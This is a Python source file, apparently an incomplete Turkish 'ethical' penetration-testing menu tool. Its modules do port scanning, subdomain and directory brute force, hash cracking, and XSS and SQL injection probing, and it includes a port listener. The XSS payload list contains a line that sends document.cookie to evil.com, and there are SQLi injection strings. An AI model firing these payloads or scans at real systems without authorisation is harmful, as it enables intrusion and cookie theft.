#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║      SIBER_ARAC v3.0 - ETIK SIBER GUVENLIK SUITI              ║
║    Yalnizca yetkili sistemlerde ve egitim amaciyla kullanin!   ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import platform
import subprocess
import socket
import threading
import hashlib
import base64
import json
import re
import random
import string
import urllib.parse
import urllib.request
import ipaddress
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import product

# ──────────────────────────────────────────────────────────
# BAĞIMLILIKLAR
# ──────────────────────────────────────────────────────────
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama requests -q")
    from colorama import Fore, Style, init
    init(autoreset=True)

try:
    import requests
except ImportError:
    os.system("pip install requests -q")
    import requests

# ──────────────────────────────────────────────────────────
# GLOBAL
# ──────────────────────────────────────────────────────────
RAPOR_VERILERI = []
GUNCELLEME_KONTROL = False

# ──────────────────────────────────────────────────────────
# YARDIMCILAR
# ──────────────────────────────────────────────────────────

def clear():
    os.system("clear" if os.name != "nt" else "cls")

def banner():
    clear()
    print(f"""{Fore.CYAN}
    ╔═══════════════════════════════════════════════════════════════╗
    ║  {Fore.RED}███████╗██╗██████╗ ███████╗██████╗                        {Fore.CYAN}║
    ║  {Fore.RED}██╔════╝██║██╔══██╗██╔════╝██╔══██╗                       {Fore.CYAN}║
    ║  {Fore.RED}███████╗██║██████╔╝█████╗  ██████╔╝                       {Fore.CYAN}║
    ║  {Fore.RED}╚════██║██║██╔══██╗██╔══╝  ██╔══██╗                       {Fore.CYAN}║
    ║  {Fore.RED}███████║██║██║  ██║███████╗██║  ██║                       {Fore.CYAN}║
    ║  {Fore.RED}╚══════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                       {Fore.CYAN}║
    ║                                                               ║
    ║  {Fore.YELLOW}ETIK SIBER GUVENLIK & SIZMA TESTI SUITI v3.0{Fore.CYAN}            ║
    ║  {Fore.WHITE}Sistem: {platform.system()} | Python: {platform.python_version()} | Tarih: {datetime.now().strftime('%Y-%m-%d')}{Fore.CYAN}  ║
    ╚═══════════════════════════════════════════════════════════════╝
    {Style.RESET_ALL}""")

def log(msg, tip="info"):
    ts = datetime.now().strftime("%H:%M:%S")
    renkler = {
        "info": Fore.CYAN, "success": Fore.GREEN, "warning": Fore.YELLOW,
        "error": Fore.RED, "highlight": Fore.MAGENTA
    }
    c = renkler.get(tip, Fore.WHITE)
    print(f"{Fore.WHITE}[{ts}] {c}{msg}{Style.RESET_ALL}")
    RAPOR_VERILERI.append(f"[{ts}] [{tip.upper()}] {msg}")

def pause():
    input(f"\n{Fore.CYAN}[+] Ana menuye donmek icin Enter'a basin...{Style.RESET_ALL}")

def kaydet_rapor():
    if RAPOR_VERILERI:
        dosya = f"siber_arac_rapor_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(dosya, 'w', encoding='utf-8') as f:
            f.write("="*70 + "\n")
            f.write("  SIBER_ARAC v3.0 - SIZMA TESTI RAPORU\n")
            f.write(f"  Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*70 + "\n\n")
            for satir in RAPOR_VERILERI:
                f.write(satir + "\n")
        log(f"Rapor kaydedildi: {dosya}", "success")

def renkli_input(prompt):
    return input(f"{Fore.GREEN}{prompt}{Fore.WHITE}").strip()

def get_hedef_url():
    url = renkli_input("[?] Hedef URL: ")
    if not url:
        log("URL bos!", "error")
        return None
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url

# ──────────────────────────────────────────────────────────
# MODUL 1: GELISMIS PORT TARAYICI (multi-thread, banner, service guess)
# ──────────────────────────────────────────────────────────

def port_scanner():
    banner()
    log("GELISMIS PORT TARAYICI AKTIF", "info")
    print(f"{Fore.YELLOW}[-] Yalnizca size ait veya izin aldiginiz hedefleri tarayin!\n")

    hedef = renkli_input("[?] Hedef IP/Domain: ")
    if not hedef:
        log("Hedef bos!", "error"); return

    try:
        bas = int(renkli_input("[?] Baslangic portu [1]: ") or "1")
        bit = int(renkli_input("[?] Bitis portu [1000]: ") or "1000")
    except ValueError:
        log("Gecersiz port araligi!", "error"); return

    to = float(renkli_input("[?] Timeout (sn) [0.5]: ") or "0.5")
    thr = int(renkli_input("[?] Thread sayisi [200]: ") or "200")

    def detect_service(port):
        common = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
                  110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",
                  995:"POP3S",1433:"MSSQL",1521:"Oracle",2049:"NFS",
                  3306:"MySQL",3389:"RDP",5432:"PostgreSQL",6379:"Redis",
                  8080:"HTTP-Proxy",8443:"HTTPS-Alt",27017:"MongoDB"}
        return common.get(port, "")

    acik = []; kilit = threading.Lock()

    def tara(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(to)
            if s.connect_ex((hedef, p)) == 0:
                with kilit:
                    svc = detect_service(p)
                    banner_data = ""
                    try:
                        s.send(b"HEAD / HTTP/1.1\r\nHost: %s\r\n\r\n" % hedef.encode())
                        banner_data = s.recv(256).decode("utf-8", errors="ignore").strip()[:60]
                    except:
                        pass
                    log(f"Port {p} ACIK  [{svc}]", "success")
                    if banner_data:
                        print(f"    {Fore.WHITE}↳ {banner_data}")
                    acik.append(p)
            s.close()
        except:
            pass

    log(f"Taranıyor: {hedef}:{bas}-{bit} | Threads: {thr}", "info")
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=thr) as ex:
        ex.map(tara, range(bas, bit+1))
    sure = time.time() - t0
    log(f"Tamamlandi! Sure: {sure:.2f} sn | Acik port: {len(acik)}", "success")
    if acik:
        print(f"{Fore.GREEN}[+] {', '.join(map(str, acik))}")

# ──────────────────────────────────────────────────────────
# MODUL 2: SUBDOMAIN ENUM
# ──────────────────────────────────────────────────────────

def subdomain_enum():
    banner()
    log("SUBDOMAIN ENUMERASYON", "info")
    hedef = renkli_input("[?] Domain (orn: example.com): ")
    if not hedef: log("Domain bos!", "error"); return

    subs = ["www","mail","ftp","localhost","webmail","smtp","pop","ns1","ns2",
            "cpanel","whm","autodiscover","m","imap","test","ns","blog","dev",
            "admin","forum","news","vpn","mail2","mysql","old","support",
            "mobile","mx","static","docs","beta","shop","sql","secure","demo",
            "cp","calendar","wiki","web","email","img","api","app","cdn",
            "assets","video","portal","intranet","extranet","remote","git",
            "svn","jenkins","jira","grafana","prometheus","kibana","elasticsearch",
            "nagios","zabbix","cacti","munin","stage","staging","backup",
            "config","panel","manager","direct","proxy","gateway","router",
            "swap","status","monitor","logs","upload","download","stream",
            "help","service","services","store","shop","market","payment",
            "billing","account","accounts","profile","user","users","member",
            "members","client","clients","partner","partners","vendor","vendors"]

    bul = []
    log(f"{len(subs)} subdomain taranıyor...", "info")
    for s in subs:
        td = f"{s}.{hedef}"
        try:
            ip = socket.gethostbyname(td)
            log(f"{td:<35} -> {ip}", "success")
            bul.append((td, ip))
        except:
            pass
    log(f"{len(bul)} subdomain bulundu.", "info")

# ──────────────────────────────────────────────────────────
# MODUL 3: DIZIN BRUTE FORCE
# ──────────────────────────────────────────────────────────

def dir_bruteforce():
    banner()
    log("DIZIN BRUTE FORCE", "info")
    hedef = get_hedef_url()
    if not hedef: return

    dizinler = [
        "admin","login","dashboard","api","test","backup","config",
        "wp-admin","phpmyadmin","admin.php","login.php","uploads",
        "images","css","js","assets","api/v1","api/v2","swagger",
        ".env","robots.txt","sitemap.xml",".git",".htaccess",
        "wp-content","wp-includes","cgi-bin","tmp","temp","logs",
        "graphql","console","shell","administrator","manage","panel",
        "backend","dev","staging","prod","uat","actuator","health",
        "metrics","prometheus","info","exchange","owa",
        ".svn",".git/config",".DS_Store","crossdomain.xml",
        "clientaccesspolicy.xml","xmlrpc.php","wp-json","_debug",
        "server-status","server-info","phpinfo.php","info.php",
        "debug","error","errors","exception","exceptions",
        "payment","payments","order","orders","checkout","cart",
        ".aws","credentials","secret","secrets","token","tokens",
        "key","keys","cert","certs","pem","private","pub","public"]

    bul = []
    log(f"{len(dizinler)} endpoint taranıyor...", "info")
    for d in dizinler:
        url = f"{hedef}/{d}"
        try:
            r = requests.get(url, timeout=4, allow_redirects=False,
                             headers={"User-Agent": "SiberArac/3.0"})
            if r.status_code in [200, 201, 204, 301, 302, 307, 308, 401, 403, 500]:
                boyut = len(r.content)
                log(f"[{r.status_code}] {url}  ({boyut} byte)", "success")
                bul.append((url, r.status_code))
        except:
            pass
    log(f"{len(bul)} dizin/endpoint bulundu.", "info")

# ──────────────────────────────────────────────────────────
# MODUL 4: HASH CRACKER
# ──────────────────────────────────────────────────────────

def hash_cracker():
    banner()
    log("HASH CRACKER (MD5/SHA1/SHA256/SHA512)", "info")
    h = renkli_input("[?] Kirilacak hash: ")
    if not h: log("Hash bos!", "error"); return

    L = len(h)
    if L == 32:      tip = "md5";     fn = hashlib.md5
    elif L == 40:    tip = "sha1";    fn = hashlib.sha1
    elif L == 64:    tip = "sha256";  fn = hashlib.sha256
    elif L == 128:   tip = "sha512";  fn = hashlib.sha512
    else:            log("Bilinmeyen hash formati!", "error"); return

    log(f"Hash tipi: {tip.upper()}", "info")
    wl = renkli_input("[?] Wordlist dosyasi [varsayilan]: ")

    if not wl or not os.path.exists(wl):
        log("Varsayilan wordlist kullaniliyor...", "warning")
        wordlist = ["123456","password","12345678","qwerty","123456789",
                    "letmein","1234567","football","iloveyou","admin",
                    "welcome","monkey","login","abc123","111111",
                    "123123","password123","1234","baseball","qwertyuiop",
                    "superman","1234567890","master","dragon","sunshine",
                    "princess","starwars","trustno1","batman","hacker",
                    "root","toor","kali","linux","passw0rd","Pa$$w0rd",
                    "P@ssw0rd","pass123","qwerty123","letmein123",
                    "welcome123","admin123","test123","demo123",
                    "siber","guvenlik","pentest","kali","metasploit"]
    else:
        with open(wl, 'r', encoding='utf-8', errors='ignore') as f:
            wordlist = [s.strip() for s in f.readlines()]

    log(f"Wordlist: {len(wordlist)} kelime", "info")
    t0 = time.time()
    for kelime in wordlist:
        if fn(kelime.encode()).hexdigest() == h:
            sure = time.time() - t0
            log(f"HASH KIRILDI! Sifre: {kelime}  [{sure:.3f} sn]", "success")
            return
    log("Hash kirilamadi. Daha buyuk wordlist deneyin.", "error")

# ──────────────────────────────────────────────────────────
# MODUL 5: WHOIS
# ──────────────────────────────────────────────────────────

def whois_lookup():
    banner()
    log("WHOIS SORGULAMA", "info")
    domain = renkli_input("[?] Domain: ")
    if not domain: log("Domain bos!", "error"); return
    try:
        import whois as wm
    except ImportError:
        log("python-whois kuruluyor...", "warning")
        os.system("pip install python-whois -q")
        import whois as wm
    try:
        w = wm.whois(domain)
        print(f"\n{Fore.CYAN}{'='*60}")
        for k in ["domain_name","registrar","creation_date","expiration_date",
                    "name_servers","status","emails","org","country"]:
            v = getattr(w, k, None)
            if v:
                print(f"{Fore.YELLOW}[+] {k.replace('_',' ').title():<20}: {Fore.WHITE}{v}")
        print(f"{Fore.CYAN}{'='*60}")
    except Exception as e:
        log(f"WHOIS hatasi: {e}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 6: AG BILGISI
# ──────────────────────────────────────────────────────────

def network_info():
    banner()
    log("AG BILGISI TOPLAMA", "info")
    log(f"Hostname: {socket.gethostname()}", "info")
    try:
        log(f"Local IP: {socket.gethostbyname(socket.gethostname())}", "info")
    except:
        pass
    try:
        import psutil
        log("Ag arayuzleri:", "info")
        for iface, addrs in psutil.net_if_addrs().items():
            for a in addrs:
                if a.family == socket.AF_INET:
                    print(f"  {Fore.GREEN}[✓] {iface}: {a.address}")
                elif a.family == psutil.AF_LINK:
                    print(f"  {Fore.YELLOW}    MAC: {a.address}")
    except ImportError:
        log("psutil kurulu degil.", "warning")

    h = renkli_input("\n[?] DNS cozumu yapilacak domain: ")
    if h:
        try:
            log(f"{h} -> {socket.gethostbyname(h)}", "success")
        except:
            log("DNS cozulemedi.", "error")

# ──────────────────────────────────────────────────────────
# MODUL 7: KALI ENTEGRASYON
# ──────────────────────────────────────────────────────────

def kali_tools():
    banner()
    log("KALI LINUX / PENTEST ARAC PANELI", "info")
    print(f"""
{Fore.CYAN}[1]  {Fore.WHITE}Nmap
{Fore.CYAN}[2]  {Fore.WHITE}Nikto
{Fore.CYAN}[3]  {Fore.WHITE}Gobuster
{Fore.CYAN}[4]  {Fore.WHITE}WhatWeb
{Fore.CYAN}[5]  {Fore.WHITE}Wafw00f
{Fore.CYAN}[6]  {Fore.WHITE}Sqlmap
{Fore.CYAN}[7]  {Fore.WHITE}Hydra
{Fore.CYAN}[8]  {Fore.WHITE}John
{Fore.CYAN}[9]  {Fore.WHITE}Metasploit (msfconsole)
{Fore.CYAN}[10] {Fore.WHITE}Searchsploit
{Fore.CYAN}[0]  {Fore.WHITE}Geri
    """)
    s = renkli_input("[?] Secim: ")
    check = "where" if os.name == "nt" else "which"
    tools = {
        "1":("nmap","nmap --help"),"2":("nikto","nikto -h"),
        "3":("gobuster","gobuster --help"),"4":("whatweb","whatweb --help"),
        "5":("wafw00f","wafw00f --help"),"6":("sqlmap","sqlmap --help"),
        "7":("hydra","hydra -h"),"8":("john","john --help"),
        "9":("msfconsole","msfconsole -h"),"10":("searchsploit","searchsploit -h")}
    if s in tools:
        t, cmd = tools[s]
        r = subprocess.run([check, t], capture_output=True, text=True)
        if r.returncode == 0:
            log(f"{t} calistiriliyor...", "success")
            os.system(cmd)
        else:
            log(f"{t} kurulu degil! sudo apt install {t}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 8: SSL/TLS
# ──────────────────────────────────────────────────────────

def ssl_analiz():
    banner()
    log("SSL/TLS SERTIFIKA ANALIZI", "info")
    hedef = renkli_input("[?] Domain: ")
    if not hedef: log("Domain bos!", "error"); return
    try:
        import ssl as sslmod
        ctx = sslmod.create_default_context()
        with socket.create_connection((hedef, 443), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=hedef) as ss:
                cert = ss.getpeercert()
                cipher = ss.cipher()
                ver = ss.version()
                print(f"\n{Fore.CYAN}{'='*60}")
                print(f"{Fore.GREEN}[+] Versiyon: {ver}")
                print(f"{Fore.GREEN}[+] Cipher:   {cipher[0]} ({cipher[1]} bit)")
                print(f"{Fore.GREEN}[+] Konu:     {cert.get('subject')}")
                print(f"{Fore.GREEN}[+] Veren:    {cert.get('issuer')}")
                print(f"{Fore.GREEN}[+] Baslangic: {cert.get('notBefore')}")
                print(f"{Fore.GREEN}[+] Bitis:     {cert.get('notAfter')}")
                log("Sertifika gecerli.", "success" if ver in ["TLSv1.2","TLSv1.3"] else "error")
                print(f"{Fore.CYAN}{'='*60}")
    except Exception as e:
        log(f"SSL hatasi: {e}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 9: HTTP HEADER
# ──────────────────────────────────────────────────────────

def http_headers():
    banner()
    log("HTTP GUVENLIK HEADER KONTROLU", "info")
    hedef = get_hedef_url()
    if not hedef: return

    kritik = [
        "Strict-Transport-Security","Content-Security-Policy","X-Frame-Options",
        "X-Content-Type-Options","Referrer-Policy","Permissions-Policy",
        "X-XSS-Protection","Feature-Policy","Expect-CT","Access-Control-Allow-Origin"]

    try:
        r = requests.get(hedef, timeout=10, headers={"User-Agent": "SiberArac/3.0"})
        h = r.headers
        print(f"\n{Fore.CYAN}{'='*60}")
        log(f"Sunucu: {h.get('Server','?')} | Status: {r.status_code}", "info")
        eksik = []
        for k in kritik:
            if k in h:
                print(f"  {Fore.GREEN}[✓] {k:<38} {str(h[k])[:50]}")
            else:
                print(f"  {Fore.RED}[✗] {k:<38} EKSIK")
                eksik.append(k)
        if eksik: log(f"{len(eksik)} header eksik!", "warning")
        else: log("Tum headerlar mevcut!", "success")
        print(f"{Fore.CYAN}{'='*60}")
    except Exception as e:
        log(f"HTTP hatasi: {e}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 10: XSS TARAMA
# ──────────────────────────────────────────────────────────

def xss_scan():
    banner()
    log("REFLECTED XSS TARAMA", "info")
    hedef = get_hedef_url()
    if not hedef: return

    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<script>fetch('https://evil.com/?'+document.cookie)</script>",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "{{constructor.constructor('alert(1)')()}}"]

    log("Payloadlar test ediliyor...", "info")
    bul = []
    for p in payloads:
        try:
            url = hedef + urllib.parse.quote(p)
            r = requests.get(url, timeout=8, headers={"User-Agent": "SiberArac/3.0"})
            if re.search(re.escape(p[:20]), r.text, re.I):
                log(f"[!] Muhtemel XSS: {p[:50]}...", "warning")
                bul.append(p)
        except:
            pass
    if bul:
        log(f"{len(bul)} XSS zafiyeti bulundu!", "error")
    else:
        log("Reflected XSS tespit edilemedi.", "success")

# ──────────────────────────────────────────────────────────
# MODUL 11: SQLi TARAMA
# ──────────────────────────────────────────────────────────

def sql_scan():
    banner()
    log("SQL INJECTION TARAMA", "info")
    hedef = get_hedef_url()
    if not hedef: return

    errors = ["sql syntax","mysql_fetch","ORA-","PostgreSQL","SQLite",
              "unclosed quotation","ODBC","SQLServer","JDBC",
              "Division by zero","mysql_num_rows","mysql_result",
              "Microsoft OLE DB","Syntax error in string in query"]

    payloads = ["'","\"","' OR '1'='1","' AND 1=1--",
                "\" OR \"1\"=\"1","' UNION SELECT NULL--",
                "' OR '1'='1' --","1' ORDER BY 1--",
                "1' GROUP BY 1--","1' AND SLEEP(5)--",
                "1' AND 1=1 UNION SELECT 1,2,3--"]

    log("SQLi payloadlari test ediliyor...", "info")
    bul = False
    for p in payloads:
        try:
            url = hedef + urllib.parse.quote(p)
            r = requests.get(url, timeout=8, headers={"User-Agent": "SiberArac/3.0"})
            for e in errors:
                if e.lower() in r.text.lower():
                    log(f"[!] SQLi bulundu! Error: {e}", "warning")
                    bul = True
        except:
            pass

    # Time-based test
    try:
        t0 = time.time()
        url = hedef + urllib.parse.quote("' AND SLEEP(3)--")
        r = requests.get(url, timeout=10, headers={"User-Agent": "SiberArac/3.0"})
        if time.time() - t0 > 2.5:
            log("[!] Time-based SQLi bulundu!", "warning")
            bul = True
    except:
        pass

    if not bul:
        log("SQLi tespit edilemedi.", "success")

# ──────────────────────────────────────────────────────────
# MODUL 12: IP GEOLOCATION
# ──────────────────────────────────────────────────────────

def ip_geo():
    banner()
    log("IP GEOLOCATION", "info")
    ip = renkli_input("[?] IP: ")
    if not ip: log("IP bos!", "error"); return
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
        d = r.json()
        if d.get("status")=="success":
            print(f"\n{Fore.CYAN}{'='*60}")
            for k in ["query","country","countryCode","city","regionName","isp","org","lat","lon","timezone","as"]:
                print(f"{Fore.GREEN}[+] {k:<15}: {Fore.WHITE}{d.get(k,'?')}")
            print(f"{Fore.CYAN}{'='*60}")
        else:
            log("Bilgi alinamadi.", "error")
    except Exception as e:
        log(f"Hata: {e}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 13: REVERSE IP
# ──────────────────────────────────────────────────────────

def reverse_ip():
    banner()
    log("REVERSE IP LOOKUP", "info")
    ip = renkli_input("[?] IP: ")
    if not ip: log("IP bos!", "error"); return
    try:
        hn = socket.gethostbyaddr(ip)
        log(f"Hostname: {hn[0]}", "success")
        if hn[1]: log(f"Alias: {', '.join(hn[1])}", "info")
    except socket.herror:
        log("Reverse lookup basarisiz.", "error")

# ──────────────────────────────────────────────────────────
# MODUL 14: WAF TESPITI
# ──────────────────────────────────────────────────────────

def waf_detect():
    banner()
    log("WAF/FIREWALL TESPITI", "info")
    hedef = get_hedef_url()
    if not hedef: return

    wafs = {
        "Cloudflare":["cloudflare","cf-ray","__cfduid"],
        "AWS WAF":["awselb","awsalb","x-amzn-requestid"],
        "Akamai":["akamai","akamaighost"],
        "Sucuri":["sucuri","x-sucuri"],
        "Incapsula":["incap_ses","visid_incap"],
        "F5 BIG-IP":["bigip","f5"],
        "ModSecurity":["mod_security","modsecurity"],
        "Wordfence":["wordfence"],
        "Barracuda":["barra"],
        "Cloudflare Turnstile":["turnstile"],
        "reCAPTCHA":["recaptcha"],
        "Imperva":["imperva","incapsula"]}

    try:
        normal = requests.get(hedef, timeout=8, headers={"User-Agent":"SiberArac/3.0"})
        malicious = requests.get(hedef+"?q=<script>alert(1)</script>", timeout=8,
                                 headers={"User-Agent":"SiberArac/3.0"})
        detected = []
        all_headers = str(normal.headers).lower() + str(malicious.headers).lower()
        for waf, sigs in wafs.items():
            for s in sigs:
                if s.lower() in all_headers and waf not in detected:
                    detected.append(waf)
        if detected:
            log(f"WAF: {', '.join(detected)}", "warning")
        else:
            log("WAF tespit edilemedi.", "info")
        if normal.status_code != malicious.status_code:
            log("WAF muhtemelen aktif (farkli status code)", "warning")
    except Exception as e:
        log(f"Hata: {e}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 15: SIFRE URETICI
# ──────────────────────────────────────────────────────────

def password_generator():
    banner()
    log("GUCLU SIFRE URETICI", "info")
    try:
        uz = int(renkli_input("[?] Uzunluk [16]: ") or "16")
        sayi = renkli_input("[?] Sayi? [E/h]: ").lower() != "h"
        ozel = renkli_input("[?] Ozel? [E/h]: ").lower() != "h"
        buyuk = renkli_input("[?] Buyuk harf? [E/h]: ").lower() != "h"
        adet = int(renkli_input("[?] Adet [5]: ") or "5")
    except:
        log("Gecersiz deger!", "error"); return

    havuz = string.ascii_lowercase
    if buyuk: havuz += string.ascii_uppercase
    if sayi:  havuz += string.digits
    if ozel:  havuz += "!@#$%^&*()_+-=[]{}|;:,.<>?"

    print(f"\n{Fore.CYAN}{'='*60}")
    for i in range(adet):
        print(f"{Fore.GREEN}[{i+1}] {''.join(random.choice(havuz) for _ in range(uz))}")
    print(f"{Fore.CYAN}{'='*60}")

# ──────────────────────────────────────────────────────────
# MODUL 16: BASE64
# ──────────────────────────────────────────────────────────

def base64_tool():
    banner()
    log("BASE64 ENCODE/DECODE", "info")
    s = renkli_input("[1] Encode  [2] Decode\nSecim: ")
    metin = renkli_input("Metin: ")
    if not metin: log("Bos!", "error"); return
    try:
        if s=="1": log(f"Encoded: {base64.b64encode(metin.encode()).decode()}", "success")
        elif s=="2": log(f"Decoded: {base64.b64decode(metin).decode()}", "success")
        else: log("Gecersiz!", "error")
    except Exception as e:
        log(f"Hata: {e}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 17: HASH OLUSTURUCU
# ──────────────────────────────────────────────────────────

def hash_generator():
    banner()
    log("HASH OLUSTURUCU", "info")
    metin = renkli_input("[?] Metin: ")
    if not metin: log("Bos!", "error"); return
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.GREEN}[+] MD5:    {hashlib.md5(metin.encode()).hexdigest()}")
    print(f"{Fore.GREEN}[+] SHA1:   {hashlib.sha1(metin.encode()).hexdigest()}")
    print(f"{Fore.GREEN}[+] SHA256: {hashlib.sha256(metin.encode()).hexdigest()}")
    print(f"{Fore.GREEN}[+] SHA512: {hashlib.sha512(metin.encode()).hexdigest()}")
    print(f"{Fore.CYAN}{'='*60}")

# ──────────────────────────────────────────────────────────
# MODUL 18: STEGANOGRAFI (zero-width)
# ──────────────────────────────────────────────────────────

def steganografi():
    banner()
    log("BASIT STEGANOGRAFI (Zero-Width)", "info")
    s = renkli_input("[1] Gizle  [2] Cikar\nSecim: ")
    if s=="1":
        kapak = renkli_input("Kapak metin: ")
        gizli = renkli_input("Gizlenecek: ")
        binary = ''.join(format(ord(c),'08b') for c in gizli)
        sonuc = kapak
        for bit in binary:
            sonuc += '\u200b' if bit=='1' else '\u200c'
        log("Gizlendi (kopyala):", "success")
        print(sonuc)
    elif s=="2":
        metin = renkli_input("Supheli metin: ")
        binary = "".join('1' if c=='\u200b' else '0' for c in metin if c in '\u200b\u200c')
        if binary:
            gizli = "".join(chr(int(binary[i:i+8],2)) for i in range(0,len(binary),8) if len(binary[i:i+8])==8)
            log(f"Cikarilan: {gizli}", "success") if gizli else log("Metin bulunamadi.", "error")
        else:
            log("Gizli metin yok.", "error")

# ──────────────────────────────────────────────────────────
# MODUL 19: PORT LISTENER
# ──────────────────────────────────────────────────────────

def port_listener():
    banner()
    log("PORT LISTENER", "info")
    try:
        port = int(renkli_input("[?] Port [4444]: ") or "4444")
        mx = int(renkli_input("[?] Max baglanti [5]: ") or "5")
    except:
        log("Gecersiz!", "error"); return
    log(f"Port {port} dinleniyor... (Ctrl+C ile durdurun)", "info")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(mx)
        while True:
            c, addr = s.accept()
            log(f"Baglanti: {addr[0]}:{addr[1]}", "success")
            c.send(b"SiberArac v3.0 | Baglanti aktif\n")
            try:
                data = c.recv(1024)
                if data: log(f"Veri: {data[:200].decode('utf-8','ignore')}", "info")
            except:
                pass
            c.close()
    except KeyboardInterrupt:
        log("Listener durduruldu.", "warning")
        s.close()
    except Exception as e:
        log(f"Hata: {e}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 20: TRACEROUTE
# ──────────────────────────────────────────────────────────

def traceroute():
    banner()
    log("TRACEROUTE", "info")
    hedef = renkli_input("[?] Hedef: ")
    if not hedef: log("Bos!", "error"); return
    maxh = int(renkli_input("[?] Max hop [30]: ") or "30")

    if os.name == "nt":
        log("Windows traceroute baslatiliyor...", "info")
        os.system(f"tracert -h {maxh} {hedef}")
        return

    log(f"Traceroute {hedef} (max {maxh} hop)", "info")
    print(f"\n{Fore.CYAN}{'='*60}")
    for ttl in range(1, maxh+1):
        try:
            rcv = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            snd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            rcv.settimeout(2)
            rcv.bind(("", 33434 + ttl))
            snd.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)
            t0 = time.time()
            snd.sendto(b"", (hedef, 33434 + ttl))
            try:
                _, addr = rcv.recvfrom(512)
                ms = (time.time() - t0) * 1000
                ip = addr[0]
                try:
                    hn = socket.gethostbyaddr(ip)[0]
                except:
                    hn = ip
                print(f"{Fore.GREEN}{ttl:<5}{hn:<40}{ms:>8.1f} ms")
                if ip == socket.gethostbyname(hedef):
                    log("Hedefe ulasildi!", "success"); break
            except socket.timeout:
                print(f"{Fore.YELLOW}{ttl:<5}{'*':<40}Request timed out")
            finally:
                snd.close(); rcv.close()
        except PermissionError:
            log("Root yetkisi gerekli! Windows'ta tracert kullanin.", "error")
            break
        except Exception as e:
            log(f"Hop {ttl}: {e}", "error"); break
    print(f"{Fore.CYAN}{'='*60}")

# ──────────────────────────────────────────────────────────
# MODUL 21: robots.txt ANALIZI (EKSLENMIS MODUL!)
# ──────────────────────────────────────────────────────────

def robots_analiz():
    banner()
    log("robots.txt ANALIZI", "info")
    hedef = get_hedef_url()
    if not hedef: return

    url = f"{hedef.rstrip('/')}/robots.txt"
    try:
        r = requests.get(url, timeout=8, headers={"User-Agent": "SiberArac/3.0"})
        if r.status_code == 200:
            print(f"\n{Fore.CYAN}{'='*60}")
            log("robots.txt bulundu!", "success")
            print(f"{Fore.YELLOW}[robots.txt icerigi]{Fore.WHITE}")
            print(r.text)
            disallowed = re.findall(r'Disallow:\s*(.*)', r.text, re.I)
            allowed = re.findall(r'Allow:\s*(.*)', r.text, re.I)
            sitemaps = re.findall(r'Sitemap:\s*(.*)', r.text, re.I)

            if disallowed:
                print(f"\n{Fore.RED}[!] Disallow dizinler:")
                for d in disallowed:
                    d = d.strip()
                    if d:
                        print(f"     {Fore.YELLOW}{d}")
                        if d not in ["/"]:
                            print(f"     {Fore.WHITE}     -> {hedef.rstrip('/')}{d}")
            if sitemaps:
                print(f"\n{Fore.GREEN}[+] Sitemap:{Style.RESET_ALL}")
                for s in sitemaps:
                    print(f"     {s}")
            print(f"{Fore.CYAN}{'='*60}")
        else:
            log(f"robots.txt yok (HTTP {r.status_code})", "info")
    except Exception as e:
        log(f"Hata: {e}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 22: CMS TESPITI
# ──────────────────────────────────────────────────────────

def cms_detect():
    banner()
    log("CMS TEKNOLOJI TESPITI", "info")
    hedef = get_hedef_url()
    if not hedef: return

    cms_sigs = {
        "WordPress":["/wp-content/","wp-json","wp-admin","wp-includes","wordpress"],
        "Joomla":["joomla","com_","mod_"],
        "Drupal":["drupal","/sites/default","/core/"],
        "React":["react","_next/static"],
        "Vue.js":["vue","vuejs"],
        "Angular":["angular","ng-version"],
        "Laravel":["laravel","csrf-token"],
        "Django":["django","csrfmiddleware","/admin/"],
        "Flask":["flask","wtforms"],
        "Shopify":["shopify","myshopify"],
        "Magento":["magento","skin/frontend"],
        "PrestaShop":["prestashop","/modules/"],
        "Ghost":["ghost","/ghost/"],
        "Wix":["wix","wixstatic"],
        "Squarespace":["squarespace"],
        "Bootstrap":["bootstrap","bootstrap.min"],
        "jQuery":["jquery","jquery.min"],
        "FontAwesome":["fontawesome","fa-"],
        "Google Analytics":["googletagmanager","gtag","analytics.js"]}

    try:
        r = requests.get(hedef, timeout=10, headers={"User-Agent":"SiberArac/3.0"})
        html = r.text.lower()
        hdrs = str(r.headers).lower()
        bul = []
        for cms, sigs in cms_sigs.items():
            for s in sigs:
                if s.lower() in html or s.lower() in hdrs:
                    if cms not in bul: bul.append(cms)
        print(f"\n{Fore.CYAN}{'='*60}")
        if bul:
